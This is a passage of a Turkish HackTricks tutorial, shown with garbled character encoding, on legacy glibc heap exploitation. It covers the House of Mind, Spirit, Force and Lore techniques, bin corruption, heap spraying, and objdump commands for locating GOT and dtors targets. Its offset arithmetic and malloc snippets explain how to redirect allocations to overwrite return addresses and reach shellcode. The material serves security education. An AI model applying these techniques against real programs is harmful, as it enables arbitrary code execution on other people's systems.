fb = &(av->fastbins\[fastbin\_index(size)] â€”> fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

Bu ÅŸekilde, â€œfbâ€de GOT'taki bir fonksiyonun adresi verilirse, bu adrese aÅŸÄ±rÄ± yazÄ±lmÄ±ÅŸ parÃ§a adresi yerleÅŸtirilecektir. Bunun iÃ§in arenanÄ±n dtors adreslerine yakÄ±n olmasÄ± gerekecektir. Daha kesin olarak, av->max\_fast'Ä±n aÅŸÄ±rÄ± yazÄ±lacak adresin Ã¼zerinde olmasÄ± gerekmektedir.

The House of Mind ile, av'nÄ±n konumunu kontrol edebildiÄŸimiz gÃ¶rÃ¼ldÃ¼.

Bu nedenle, size alanÄ±na 8 + NON\_MAIN\_ARENA + PREV\_INUSE yazarsak â€”> fastbin\_index() fastbins\[-1] dÃ¶ndÃ¼recektir, bu da av->max\_fast'a iÅŸaret edecektir.

Bu durumda av->max\_fast, aÅŸÄ±rÄ± yazÄ±lacak adres olacaktÄ±r (iÅŸaret ettiÄŸi deÄŸil, bu konum aÅŸÄ±rÄ± yazÄ±lacaktÄ±r).

AyrÄ±ca, serbest bÄ±rakÄ±lan parÃ§anÄ±n komÅŸusunun 8'den bÃ¼yÃ¼k olmasÄ± gerektiÄŸi gereklidir -> Daha Ã¶nce serbest bÄ±rakÄ±lan parÃ§anÄ±n boyutunun 8 olduÄŸunu sÃ¶yledik, bu sahte parÃ§ada yalnÄ±zca 8'den bÃ¼yÃ¼k bir boyut koymalÄ±yÄ±z (Ã§Ã¼nkÃ¼ shellcode serbest bÄ±rakÄ±lan parÃ§ada olacaÄŸÄ±ndan, baÅŸta nops'a dÃ¼ÅŸecek bir jmp koymalÄ±yÄ±z).

AyrÄ±ca, bu sahte parÃ§a, av->system\_mem'den daha kÃ¼Ã§Ã¼k olmalÄ±dÄ±r. av->system\_mem, 1848 bayt daha ileridedir.

\_\_DTOR\_END\_ ve GOT'taki az sayÄ±da adres nedeniyle, bu bÃ¶lÃ¼mlerin hiÃ§biri aÅŸÄ±rÄ± yazÄ±lmak iÃ§in uygun deÄŸildir, bu nedenle yÄ±ÄŸÄ±n saldÄ±rÄ±sÄ± uygulamak iÃ§in fastbin'i nasÄ±l uygulayacaÄŸÄ±mÄ±za bakalÄ±m.

BaÅŸka bir saldÄ±rÄ± yÃ¶ntemi, **av**'yi yÄ±ÄŸÄ±na yÃ¶nlendirmektir.

Boyutu 8 yerine 16 olacak ÅŸekilde deÄŸiÅŸtirirsek, fastbin\_index() fastbins\[0] dÃ¶ndÃ¼recektir ve bunu kullanarak yÄ±ÄŸÄ±nÄ± aÅŸÄ±rÄ± yazabiliriz.

Bunun iÃ§in yÄ±ÄŸÄ±nda hiÃ§bir canary veya garip deÄŸer olmamalÄ±dÄ±r, aslÄ±nda bu durumda 4 bayt sÄ±fÄ±r + EBP + RET olmalÄ±dÄ±r.

4 bayt sÄ±fÄ±r, **av**'nin bu adreste olmasÄ±nÄ± gerektirir ve bir **av**'nin ilk Ã¶ÄŸesi, 0 olmalÄ±dÄ±r.

**av->max\_fast**, EBP olacaktÄ±r ve bu, kÄ±sÄ±tlamalarÄ± atlamak iÃ§in kullanÄ±ÅŸlÄ± bir deÄŸer olacaktÄ±r.

**av->fastbins\[0]**'da, **p** adresi ile aÅŸÄ±rÄ± yazÄ±lacak ve RET olacaktÄ±r, bÃ¶ylece shellcode'a atlayacaktÄ±r.

AyrÄ±ca, **av->system\_mem** (yÄ±ÄŸÄ±n konumunun 1484 bayt yukarÄ±sÄ±nda) yeterince Ã§Ã¶p olacaktÄ±r, bu da kontrolÃ¼ atlamamÄ±za izin verecektir.

AyrÄ±ca, serbest bÄ±rakÄ±lan parÃ§anÄ±n komÅŸusunun 8'den bÃ¼yÃ¼k olmasÄ± gerektiÄŸi gereklidir -> Daha Ã¶nce serbest bÄ±rakÄ±lan parÃ§anÄ±n boyutunun 16 olduÄŸunu sÃ¶yledik, bu sahte parÃ§ada yalnÄ±zca 8'den bÃ¼yÃ¼k bir boyut koymalÄ±yÄ±z (Ã§Ã¼nkÃ¼ shellcode serbest bÄ±rakÄ±lan parÃ§ada olacaÄŸÄ±ndan, baÅŸta nops'a dÃ¼ÅŸecek bir jmp koymalÄ±yÄ±z).

**The House of Spirit**

Bu durumda, saldÄ±rgan tarafÄ±ndan deÄŸiÅŸtirilebilen bir malloc iÅŸaretÃ§isine sahip olmayÄ± arÄ±yoruz (Ã¶rneÄŸin, iÅŸaretÃ§i, bir deÄŸiÅŸkene olasÄ± bir taÅŸma altÄ±nda yÄ±ÄŸÄ±nda olabilir).

Bu ÅŸekilde, bu iÅŸaretÃ§iyi istediÄŸimiz yere yÃ¶nlendirebiliriz. Ancak, her yer geÃ§erli deÄŸildir; sahte parÃ§anÄ±n boyutu av->max\_fast'tan kÃ¼Ã§Ã¼k olmalÄ± ve daha spesifik olarak, gelecekteki bir malloc() Ã§aÄŸrÄ±sÄ±nda istenen boyuta eÅŸit olmalÄ±dÄ±r. Bu nedenle, bu iÅŸaretÃ§i savunmasÄ±z olduÄŸunda malloc(40) Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, sahte parÃ§anÄ±n boyutu 48 olmalÄ±dÄ±r.

Ã–rneÄŸin, program kullanÄ±cÄ±dan bir sayÄ± isterse, 48 girebiliriz ve deÄŸiÅŸtirilebilir malloc iÅŸaretÃ§isini sonraki 4 bayta (ÅŸans eseri EBP'ye ait olabilecek) yÃ¶nlendirebiliriz, bÃ¶ylece 48 geride kalÄ±r, sanki baÅŸlÄ±k boyutuymuÅŸ gibi. AyrÄ±ca, ptr-4+48 adresinin birkaÃ§ koÅŸulu karÅŸÄ±lamasÄ± gerekir (bu durumda ptr=EBP), yani 8 < ptr-4+48 < av->system\_mem.

Bu koÅŸullar saÄŸlanÄ±rsa, bir sonraki malloc Ã§aÄŸrÄ±sÄ± malloc(40) olduÄŸunda, EBP adresini atayacaktÄ±r. EÄŸer saldÄ±rgan bu malloc'ta ne yazÄ±lacaÄŸÄ±nÄ± da kontrol edebiliyorsa, hem EBP'yi hem de EIP'yi istediÄŸi adresle aÅŸÄ±rÄ± yazabilir.

Bunun nedeni, free() Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, yÄ±ÄŸÄ±n Ã¼zerindeki EBP adresine iÅŸaret eden bir parÃ§anÄ±n, yeni malloc() iÃ§in ayrÄ±lacak olan parÃ§anÄ±n boyutuna mÃ¼kemmel bir ÅŸekilde uygun bir parÃ§a olduÄŸunu kaydetmesidir, bu nedenle o adresi atar.

**The House of Force**

Gereklidir:

* AÅŸÄ±rÄ± yazmaya izin veren bir parÃ§aya taÅŸma
* KullanÄ±cÄ± tarafÄ±ndan belirlenen boyutta bir malloc() Ã§aÄŸrÄ±sÄ±
* KullanÄ±cÄ± tarafÄ±ndan tanÄ±mlanabilen verilerle bir malloc() Ã§aÄŸrÄ±sÄ±

Ä°lk olarak, wilderness parÃ§asÄ±nÄ±n boyutunu Ã§ok bÃ¼yÃ¼k bir deÄŸerle (0xffffffff) aÅŸÄ±rÄ± yazÄ±yoruz, bÃ¶ylece yeterince bÃ¼yÃ¼k herhangi bir bellek talebi, yÄ±ÄŸÄ±n geniÅŸletilmeden \_int\_malloc() iÃ§inde iÅŸlenir.

Ä°kincisi, av->top'u saldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bir bellek alanÄ±na, Ã¶rneÄŸin yÄ±ÄŸÄ±na iÅŸaret edecek ÅŸekilde deÄŸiÅŸtirmektir. av->top'a \&EIP - 8 yazÄ±lacaktÄ±r.

av->top'u, saldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bellek alanÄ±na iÅŸaret edecek ÅŸekilde aÅŸÄ±rÄ± yazmalÄ±yÄ±z:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim, mevcut wilderness parÃ§asÄ±nÄ±n adresinin deÄŸerini (mevcut av->top) alÄ±r ve remainder, o adresin Ã¼zerine malloc() tarafÄ±ndan istenen bayt sayÄ±sÄ±nÄ± ekler. Yani, eÄŸer \&EIP-8 0xbffff224'de ve av->top 0x080c2788'de ise, kontrol edilen malloc'ta av->top'un $EIP-8'e iÅŸaret etmesi iÃ§in ayÄ±rmamÄ±z gereken miktar:

0xbffff224 - 0x080c2788 = 3086207644.

BÃ¶ylece av->top'a deÄŸiÅŸtirilmiÅŸ deÄŸer kaydedilir ve bir sonraki malloc, EIP'ye iÅŸaret eder ve onu aÅŸÄ±rÄ± yazabilir.

Yeni wilderness parÃ§asÄ±nÄ±n boyutunun, son malloc() talebinden daha bÃ¼yÃ¼k olmasÄ± Ã¶nemlidir. Yani, wilderness \&EIP-8'e iÅŸaret ediyorsa, boyut tam olarak yÄ±ÄŸÄ±ndaki EBP alanÄ±nda kalacaktÄ±r.

**The House of Lore**

**SmallBin BozulmasÄ±**

Serbest bÄ±rakÄ±lan parÃ§alar, boyutlarÄ±na gÃ¶re bin'e yerleÅŸtirilir. Ancak, yerleÅŸtirilmeden Ã¶nce unsorted bins'de saklanÄ±r. Bir parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda, hemen bin'ine yerleÅŸtirilmez, bunun yerine unsorted bins'de kalÄ±r. ArdÄ±ndan, yeni bir parÃ§a ayrÄ±ldÄ±ÄŸÄ±nda ve Ã¶nceki serbest bÄ±rakÄ±lan parÃ§a ona hizmet edebiliyorsa, onu geri dÃ¶ndÃ¼rÃ¼r; ancak daha bÃ¼yÃ¼k bir parÃ§a ayrÄ±ldÄ±ÄŸÄ±nda, unsorted bins'deki serbest bÄ±rakÄ±lan parÃ§a uygun bin'ine yerleÅŸtirilir.

ZayÄ±f kodu elde etmek iÃ§in bellek talebi, av->max\_fast'tan (genellikle 72) bÃ¼yÃ¼k ve MIN\_LARGE\_SIZE'dan (512) kÃ¼Ã§Ã¼k olmalÄ±dÄ±r.

EÄŸer bin'de istenen boyuta uygun bir parÃ§a varsa, bu parÃ§a, serbest bÄ±rakÄ±ldÄ±ktan sonra unsorted bins'den Ã§Ä±karÄ±larak geri dÃ¶ndÃ¼rÃ¼lÃ¼r:

bck = victim->bk; Ã–nceki parÃ§aya iÅŸaret eder, deÄŸiÅŸtirebileceÄŸimiz tek bilgidir.

bin->bk = bck; Ã–nceki parÃ§a son parÃ§a olur, eÄŸer bck yÄ±ÄŸÄ±na iÅŸaret ediyorsa, bir sonraki ayrÄ±lan parÃ§aya bu adres verilecektir.

bck->fd = bin; Bu, bu parÃ§anÄ±n bin'e iÅŸaret etmesini saÄŸlayarak listeyi kapatÄ±r.

Gerektirir:

Ä°ki malloc ayrÄ±lmasÄ±, bÃ¶ylece ilki, ikincisi serbest bÄ±rakÄ±ldÄ±ktan sonra taÅŸma yapÄ±labilir (yani, taÅŸma yapÄ±lmadan Ã¶nce ikinci parÃ§adan daha bÃ¼yÃ¼k bir malloc ayrÄ±lmÄ±ÅŸ olmalÄ±dÄ±r).

SaldÄ±rganÄ±n belirlediÄŸi adrese ayrÄ±lan malloc'un, saldÄ±rgan tarafÄ±ndan kontrol edilmesi gerekir.

AmaÃ§ ÅŸudur: EÄŸer serbest bÄ±rakÄ±lmÄ±ÅŸ bir yÄ±ÄŸÄ±n parÃ§asÄ±na taÅŸma yapabiliyorsak ve onun altÄ±nda bir parÃ§a varsa, bk iÅŸaretÃ§isini deÄŸiÅŸtirebiliriz. EÄŸer bk iÅŸaretÃ§isini deÄŸiÅŸtirirsek ve bu parÃ§a, bin listesinin ilk parÃ§asÄ± olursa ve ayrÄ±lÄ±rsa, bin'e, sunulacak son parÃ§anÄ±n sahte adresinin (yÄ±ÄŸÄ±n veya GOT gibi) olduÄŸunu sÃ¶yleyebiliriz. BÃ¶ylece, baÅŸka bir parÃ§a ayrÄ±ldÄ±ÄŸÄ±nda ve saldÄ±rganÄ±n buna eriÅŸimi varsa, istenen konumda bir parÃ§a alacak ve oraya yazabilecektir.

DeÄŸiÅŸtirilen parÃ§ayÄ± serbest bÄ±raktÄ±ktan sonra, serbest bÄ±rakÄ±lan parÃ§adan daha bÃ¼yÃ¼k bir parÃ§a ayrÄ±lmasÄ± gerekir, bÃ¶ylece deÄŸiÅŸtirilen parÃ§a unsorted bins'den Ã§Ä±karÄ±lÄ±r ve uygun bin'ine yerleÅŸtirilir.

Bir kez bin'ine yerleÅŸtirildiÄŸinde, taÅŸma yoluyla bk iÅŸaretÃ§isini deÄŸiÅŸtirmek iÃ§in zamanÄ± gelmiÅŸtir, bÃ¶ylece istediÄŸimiz adresi aÅŸÄ±rÄ± yazabiliriz.

Bu nedenle, bin'in, yeterince malloc() Ã§aÄŸrÄ±sÄ± yapÄ±lana kadar sÄ±rada beklemesi gerekir, bÃ¶ylece deÄŸiÅŸtirilen bin yeniden kullanÄ±lÄ±r ve bin'e, bir sonraki parÃ§anÄ±n sahte adreste olduÄŸunu dÃ¼ÅŸÃ¼ndÃ¼rÃ¼r. ArdÄ±ndan, ilgilendiÄŸimiz parÃ§a verilecektir.

Zafiyetin mÃ¼mkÃ¼n olan en kÄ±sa sÃ¼rede Ã§alÄ±ÅŸmasÄ± iÃ§in ideal olan: ZayÄ±f parÃ§anÄ±n ayrÄ±lmasÄ±, deÄŸiÅŸtirilecek parÃ§anÄ±n ayrÄ±lmasÄ±, bu parÃ§anÄ±n serbest bÄ±rakÄ±lmasÄ±, daha bÃ¼yÃ¼k bir parÃ§a ayrÄ±lmasÄ±, parÃ§anÄ±n deÄŸiÅŸtirilmesi (zafiyet), zayÄ±f parÃ§ayla aynÄ± boyutta bir parÃ§a ayrÄ±lmasÄ± ve bu, seÃ§ilen adrese iÅŸaret eden ikinci parÃ§a olacaktÄ±r.

Bu saldÄ±rÄ±yÄ± korumak iÃ§in, parÃ§anÄ±n â€œsahteâ€ olmadÄ±ÄŸÄ±nÄ± kontrol eden tipik bir kontrol kullanÄ±ldÄ±: bck->fd'nin victim'a iÅŸaret edip etmediÄŸi kontrol edilir. Yani, bizim durumumuzda, yÄ±ÄŸÄ±nda iÅŸaret edilen sahte fd* iÅŸaretÃ§isinin victim'a iÅŸaret edip etmediÄŸi kontrol edilir. Bu korumayÄ± aÅŸmak iÃ§in, saldÄ±rganÄ±n bir ÅŸekilde (muhtemelen yÄ±ÄŸÄ±n Ã¼zerinden) uygun adrese victim adresini yazabilmesi gerekir. BÃ¶ylece, gerÃ§ek bir parÃ§a gibi gÃ¶rÃ¼nÃ¼r.

**LargeBin BozulmasÄ±**

Ã–nceki gereksinimlerin yanÄ± sÄ±ra, ayrÄ±lan parÃ§alarÄ±n boyutlarÄ± 512'den bÃ¼yÃ¼k olmalÄ±dÄ±r.

SaldÄ±rÄ±, Ã¶nceki gibi, bk iÅŸaretÃ§isini deÄŸiÅŸtirmeyi gerektirir ve tÃ¼m bu malloc() Ã§aÄŸrÄ±larÄ±na ihtiyaÃ§ vardÄ±r, ancak ayrÄ±ca deÄŸiÅŸtirilen parÃ§anÄ±n boyutunu, bu boyut - nb < MINSIZE olacak ÅŸekilde deÄŸiÅŸtirmek gerekir.

Ã–rneÄŸin, boyutu 1552 yapmak, 1552 - 1544 = 8 < MINSIZE (Ã§Ä±karma negatif olmamalÄ±dÄ±r Ã§Ã¼nkÃ¼ unsigned bir deÄŸer karÅŸÄ±laÅŸtÄ±rÄ±lÄ±r).

AyrÄ±ca, durumu daha da karmaÅŸÄ±klaÅŸtÄ±rmak iÃ§in bir yamanÄ±n uygulandÄ±ÄŸÄ± gÃ¶rÃ¼lmÃ¼ÅŸtÃ¼r.

**Heap Spraying**

Temelde, mÃ¼mkÃ¼n olan tÃ¼m yÄ±ÄŸÄ±n belleÄŸi ayÄ±rmak ve bunlarÄ± bir shellcode ile biten nop'larla doldurmak anlamÄ±na gelir. AyrÄ±ca, 0x0c kullanÄ±larak bir yastÄ±k oluÅŸturulur. Ã‡Ã¼nkÃ¼ 0x0c0c0c0c adresine atlamaya Ã§alÄ±ÅŸÄ±lacak ve bu nedenle, bu adrese yazÄ±lan herhangi bir iÅŸaretÃ§i, oraya atlayacaktÄ±r. Temel olarak taktik, mÃ¼mkÃ¼n olduÄŸunca fazla alan ayÄ±rmak ve bir iÅŸaretÃ§iyi aÅŸÄ±rÄ± yazmak ve 0x0c0c0c0c adresine atlamaktÄ±r; umarÄ±z orada nop'lar vardÄ±r.

**Heap Feng Shui**

BelleÄŸi, rezervasyonlar ve serbest bÄ±rakmalar yoluyla, boÅŸ parÃ§alarÄ±n arasÄ±nda ayrÄ±lmÄ±ÅŸ parÃ§alar kalacak ÅŸekilde dÃ¼zenlemeyi iÃ§erir. TaÅŸma yapÄ±lacak buffer, bu boÅŸluklardan birinde yer alacaktÄ±r.

**objdump -d yÃ¼rÃ¼tÃ¼lebilir** â€”> FonksiyonlarÄ± disassemble eder\
**objdump -d ./PROGRAMA | grep FUNCION** â€”> Fonksiyon adresini alÄ±r\
**objdump -d -Mintel ./shellcodeout** â€”> GerÃ§ekten shellcode olduÄŸuna ve OpCodes'u Ã§Ä±karmak iÃ§in\
**objdump -t ./exec | grep varBss** â€”> DeÄŸiÅŸkenler ve fonksiyonlar iÃ§in adres tablosu\
**objdump -TR ./exec | grep exit(func lib)** â€”> KÃ¼tÃ¼phane fonksiyonlarÄ±nÄ±n adreslerini almak iÃ§in (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** â€”> GOT'ta aÅŸÄ±rÄ± yazÄ±lacak puts adresini alÄ±r\
**objdump -D ./exec** â€”> TÃ¼mÃ¼nÃ¼ disassemble eder, plt giriÅŸlerine kadar\
**objdump -p -/exec**\
**Info functions strncmp â€”>** gdb'de fonksiyon bilgisi

## Ä°lginÃ§ Kurslar

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referanslar**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter'da** bizi takip edin ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **HackTricks'e ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n.**

</details>
{% endhint %}
